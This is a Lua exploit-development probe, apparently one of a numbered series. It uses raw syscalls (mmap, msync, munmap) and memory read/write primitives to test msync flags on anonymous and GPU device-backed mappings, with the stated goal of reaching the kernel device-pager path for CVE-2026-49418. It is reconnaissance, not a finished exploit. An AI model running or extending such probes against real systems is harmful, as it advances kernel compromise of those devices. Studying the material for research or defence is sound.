-- CRASH_CLASS: MODERATE
-- PROBE 58b: msync behavior on anonymous vs device-backed mappings
--
-- Context: 58a showed msync(65) with MS_SYNC kills process on GPU mmap.
-- This probe tests: (1) anonymous mapping survival, (2) per-flag behavior,
-- (3) whether device-pager code path is reached before death.
-- CVE-2026-49418 needs MS_INVALIDATE on device pages.

print("=== PROBE 58b: MSYNC ANON vs DEVICE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_mmap   = make_syscall(477)
local sc_msync  = make_syscall(65)
local sc_munmap = make_syscall(73)
local sc_getpid = make_syscall(20)
local PAGE = 0x4000

--------------------------------------------------------------------
-- CANARY
--------------------------------------------------------------------
print("--- CANARY ---")
local ok, pid = pcall(function() return sc_getpid() end)
if ok then print("  pid=" .. tostring(to_num(pid)))
else print("  FAIL"); return end

--------------------------------------------------------------------
-- [A] ANONYMOUS mmap + msync MS_SYNC
--------------------------------------------------------------------
print("")
print("--- [A] ANON MMAP + MS_SYNC ---")

local ok_a, anon = pcall(function()
    return sc_mmap(
        uint64(0),
        uint64(4 * PAGE),
        uint64(3),              -- PROT_READ | PROT_WRITE
        uint64(0x1002),         -- MAP_SHARED | MAP_ANON
        uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(0)
    )
end)

if not ok_a then
    print("  anon mmap PCALL-FAIL")
    return
end
print("  anon base=" .. hex(anon))

local ah, al = get_hi_lo(anon)
if al == 0 and ah == 0 then print("  NULL mapping"); return end

pcall(function() memory.write_dword(anon, 0xDEADBEEF) end)
local ok_r, v = pcall(function() return memory.read_dword(anon) end)
print("  write+read: " .. (ok_r and hex(v) or "FAIL"))

print("  BEFORE msync(anon, MS_SYNC=0)...")
local ok_s, rs = pcall(function()
    return sc_msync(uint64(anon), uint64(4 * PAGE), uint64(0))
end)
if ok_s then
    print("  msync(MS_SYNC) ret=" .. tostring(to_num(rs)))
else
    print("  msync(MS_SYNC) PCALL-FAIL — killed!")
    return
end

--------------------------------------------------------------------
-- [B] ANONYMOUS mmap + msync MS_ASYNC
--------------------------------------------------------------------
print("")
print("--- [B] ANON + MS_ASYNC ---")
print("  BEFORE msync(anon, MS_ASYNC=1)...")
local ok_b, rb = pcall(function()
    return sc_msync(uint64(anon), uint64(4 * PAGE), uint64(1))
end)
if ok_b then
    print("  msync(MS_ASYNC) ret=" .. tostring(to_num(rb)))
else
    print("  msync(MS_ASYNC) PCALL-FAIL — killed!")
    return
end

--------------------------------------------------------------------
-- [C] ANONYMOUS mmap + msync MS_INVALIDATE
--------------------------------------------------------------------
print("")
print("--- [C] ANON + MS_INVALIDATE ---")
print("  BEFORE msync(anon, MS_INVALIDATE=2)...")
local ok_c, rc = pcall(function()
    return sc_msync(uint64(anon), uint64(4 * PAGE), uint64(2))
end)
if ok_c then
    print("  msync(MS_INVALIDATE) ret=" .. tostring(to_num(rc)))
    -- Check page state after invalidate
    local ok_rr, vv = pcall(function() return memory.read_dword(anon) end)
    if ok_rr then
        print("  post-invalidate read: " .. hex(vv))
    else
        print("  post-invalidate read: FAULT")
    end
else
    print("  msync(MS_INVALIDATE) PCALL-FAIL — killed!")
    return
end

-- Cleanup anon
pcall(function() return sc_munmap(uint64(anon), uint64(4 * PAGE)) end)

--------------------------------------------------------------------
-- [D] PRIVATE ANON mmap + msync (different backing)
--------------------------------------------------------------------
print("")
print("--- [D] PRIVATE ANON + MS_INVALIDATE ---")

local ok_d, priv = pcall(function()
    return sc_mmap(
        uint64(0),
        uint64(4 * PAGE),
        uint64(3),              -- PROT_READ | PROT_WRITE
        uint64(0x1001),         -- MAP_PRIVATE | MAP_ANON
        uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(0)
    )
end)

if ok_d then
    local ph, pl = get_hi_lo(priv)
    print("  priv base=" .. hex(priv))
    if pl ~= 0 or ph ~= 0 then
        pcall(function() memory.write_dword(priv, 0xBAADF00D) end)
        print("  BEFORE msync(priv, MS_INVALIDATE=2)...")
        local ok_dd, rd = pcall(function()
            return sc_msync(uint64(priv), uint64(4 * PAGE), uint64(2))
        end)
        if ok_dd then
            print("  msync ret=" .. tostring(to_num(rd)))
            local ok_rr2, vv2 = pcall(function() return memory.read_dword(priv) end)
            print("  post-inv read: " .. (ok_rr2 and hex(vv2) or "FAULT"))
        else
            print("  PCALL-FAIL")
        end
        pcall(function() return sc_munmap(uint64(priv), uint64(4 * PAGE)) end)
    end
else
    print("  priv mmap FAIL")
end

--------------------------------------------------------------------
-- [E] GPU MMAP (device-backed) + msync — the CVE target
-- This section WILL LIKELY KILL the process based on 58a results.
-- We print a marker before each step to see exactly where death occurs.
--------------------------------------------------------------------
print("")
print("--- [E] GPU MMAP + MSYNC (DEVICE-BACKED) ---")

local ok_e, gpu = pcall(function()
    return sc_mmap(
        uint64(0),
        uint64(4 * PAGE),
        uint64(0x33),           -- PROT_READ | PROT_WRITE | GPU flags
        uint64(0x1002),         -- MAP_SHARED | MAP_ANON
        uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(0)
    )
end)

if not ok_e then
    print("  gpu mmap PCALL-FAIL")
    print("=== PROBE 58b COMPLETE ===")
    return
end
print("  gpu base=" .. hex(gpu))

pcall(function() memory.write_dword(gpu, 0xCAFEBABE) end)
local ok_gr, gv = pcall(function() return memory.read_dword(gpu) end)
print("  gpu write+read: " .. (ok_gr and hex(gv) or "FAIL"))

-- Try just 1 page instead of 4
print("  [MARKER-E1] BEFORE msync(gpu, 1 page, MS_INVALIDATE=2)...")
local ok_eg, rg = pcall(function()
    return sc_msync(uint64(gpu), uint64(PAGE), uint64(2))
end)
if ok_eg then
    print("  [MARKER-E2] msync(gpu,MS_INVALIDATE) ret=" .. tostring(to_num(rg)))
    print("  >>> GPU MSYNC MS_INVALIDATE SURVIVED <<<")

    -- Check post state
    local ok_gp, gvp = pcall(function() return memory.read_dword(gpu) end)
    if ok_gp then
        print("  post-inv gpu read: " .. hex(gvp))
        if to_num(gvp) ~= 0xCAFEBABE then
            print("  >>> PAGE CONTENT CHANGED — device pager re-inserted page <<<")
        end
    else
        print("  post-inv gpu read: FAULT — page was invalidated!")
        print("  >>> CVE-2026-49418 DEVICE PAGER PATH REACHED <<<")
    end
else
    print("  [MARKER-E2] PCALL-FAIL — msync on GPU mmap killed!")
    print("  >>> DEVICE PAGER KILLS — need alternative approach <<<")
end

--------------------------------------------------------------------
-- FINAL CANARY
--------------------------------------------------------------------
print("")
print("--- FINAL CANARY ---")
local ok2, pid2 = pcall(function() return sc_getpid() end)
if ok2 then print("  pid=" .. tostring(to_num(pid2)))
else print("  process dead") end

print("")
print("=== PROBE 58b COMPLETE ===")
